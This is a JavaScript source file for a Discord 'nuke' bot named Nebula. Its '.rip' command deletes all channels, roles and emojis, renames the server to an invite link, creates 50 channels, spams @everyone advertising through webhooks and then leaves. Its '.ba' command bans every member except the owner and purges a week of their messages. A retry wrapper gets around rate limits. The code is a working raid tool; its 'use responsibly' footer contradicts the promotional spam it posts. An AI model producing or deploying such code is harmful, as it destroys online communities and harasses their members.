const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');

dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Nebula Bot is online and awaiting .rip command...');
});

app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = error.retry_after || 1000;
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  return null;
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();

  // ===== HELP COMMAND =====
  if (command === 'help') {
    const helpEmbed = new EmbedBuilder()
      .setTitle('🤖 Nebula Bot Commands')
      .setDescription('Here are the available commands for Nebula Bot:')
      .addFields(
        { name: '.rip', value: 'Nukes the server (deletes roles, emojis, creates 50 channels, spams 1000 messages)' },
        { name: '.ba', value: 'Bans all members (except owner)' },
        { name: '.help', value: 'Sends this help message to your DMs' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'Use responsibly - only in servers you own!' });

    try {
      await message.author.send({ embeds: [helpEmbed] });
      await message.reply('📬 Sent help to your DMs!');
    } catch (err) {
      console.error('❌ Could not send DM:', err.message);
      await message.reply('❌ I couldn\'t send you a DM. Please enable DMs from server members.');
    }
    return;
  }

  // ===== BAN ALL MEMBERS =====
  if (command === 'ba') {
    if (!message.member.permissions.has('BanMembers')) {
      return message.reply('❌ You don\'t have permission to ban members.');
    }

    const guild = message.guild;

    const members = await guild.members.fetch();
    const membersToBan = members.filter(m =>
      m.id !== guild.ownerId && !m.user.bot
    );

    if (membersToBan.size === 0) {
      return message.reply('❌ No members available to ban.');
    }

    console.log(`🔪 Banning ${membersToBan.size} members...`);

    const batchSize = 20;
    const batchDelay = 50; // ms
    let bannedCount = 0;

    for (let i = 0; i < membersToBan.size; i += batchSize) {
      const batch = membersToBan.array().slice(i, i + batchSize);
      const promises = [];

      for (const [id, member] of batch) {
        promises.push((async () => {
          try {
            await handleRateLimit(() => guild.members.ban(member, {
              reason: 'Nebula Ban All',
              deleteMessageSeconds: 604800
            }));
            bannedCount++;
          } catch (err) {
            console.error(`❌ Failed to ban ${member.user.tag}: ${err.message}`);
          }
        })());
      }

      await Promise.all(promises);
      await new Promise(r => setTimeout(r, batchDelay));
    }

    console.log(`✅ Successfully banned ${bannedCount}/${membersToBan.size} members.`);
    await message.reply(`✅ Banned ${bannedCount} members.`);
    return;
  }

  // ===== RIP COMMAND =====
  if (command === 'rip') {
    const guild = message.guild;
    const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
    const channelName = 'neb-was-here';

    try {
      console.log(`🎯 Targeting server: ${guild.name}`);

      let sentMessages = 0;
      const MAX_MESSAGES = 1000;

      // Step 1: Delete existing channels concurrently
      await Promise.all(guild.channels.cache.map(channel =>
        handleRateLimit(() => channel.delete().catch(() => {}))
      ));

      // Step 2: Delete roles
      await Promise.all(guild.roles.cache.map(async role => {
        if (role.name !== '@everyone' && !role.managed) {
          await handleRateLimit(() => role.delete().catch(() => {}));
        }
      }));

      // Step 3: Delete emojis
      await Promise.all(guild.emojis.cache.map(async emoji =>
        handleRateLimit(() => emoji.delete().catch(() => {}))
      ));

      // Step 4: Rename server
      await handleRateLimit(() => guild.edit({ name: 'discord.gg/migh' }).catch(() => {}));

      // Step 5: Create 50 channels FAST
      const createdChannels = [];
      const totalChannelsToCreate = 50;

      console.log(`🆕 Creating ${totalChannelsToCreate} channels FAST...`);

      const createPromises = [];

      for (let i = 0; i < totalChannelsToCreate; i++) {
        createPromises.push((async () => {
          const channel = await handleRateLimit(() =>
            guild.channels.create({ name: `${channelName}-${i + 1}` })
          );
          if (channel) {
            createdChannels.push(channel);
            console.log(`✅ Created channel: ${channel.name}`);
            startSpam(channel, i % 2 === 0); // alternate between webhook and .send()
          }
        })());
      }

      await Promise.all(createPromises);

      if (createdChannels.length === 0) {
        return message.channel.send('❌ Could not create any channels. Aborting.');
      }

      // Function to spam in a single channel until we hit global limit
      const startSpam = async (channel, useWebhook) => {
        const avatarURL = 'https://i.imgur.com/6QbX6yA.png '; // Nebula icon

        while (sentMessages < MAX_MESSAGES) {
          if (useWebhook) {
            try {
              const webhook = await handleRateLimit(() =>
                channel.createWebhook({
                  name: 'Nebula',
                  avatar: avatarURL
                }).catch(() => null)
              );

              if (webhook) {
                await handleRateLimit(() => webhook.send(spamMessage));
                sentMessages++;
                if (sentMessages % 100 === 0) console.log(`📨 [WEBHOOK] Sent: ${sentMessages}`);
              } else {
                // Fallback to .send()
                await handleRateLimit(() => channel.send(spamMessage));
                sentMessages++;
                if (sentMessages % 100 === 0) console.log(`📨 [FALLBACK] Sent: ${sentMessages}`);
              }
            } catch (err) {
              console.error(`⚠️ Webhook failed: ${err.message}`);
              try {
                await handleRateLimit(() => channel.send(spamMessage));
                sentMessages++;
              } catch {}
            }
          } else {
            try {
              await handleRateLimit(() => channel.send(spamMessage));
              sentMessages++;
              if (sentMessages % 100 === 0) console.log(`📨 [SEND] Sent: ${sentMessages}`);
            } catch (err) {
              console.error(`⚠️ Send failed: ${err.message}`);
            }
          }

          await new Promise(r => setTimeout(r, 1)); // tiny delay
        }
      };

      // Wait up to 10 seconds to allow spam to finish
      await new Promise(r => setTimeout(r, 10000));

      // Leave server
      await handleRateLimit(() => guild.leave());

      console.log('✅ Successfully completed operation.');
      await message.channel.send('✅ Successfully nuked server.');

    } catch (err) {
      console.error('🚨 Critical error during operation:', err.message);
      await message.channel.send(`❌ Error occurred: ${err.message}`);
    }
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
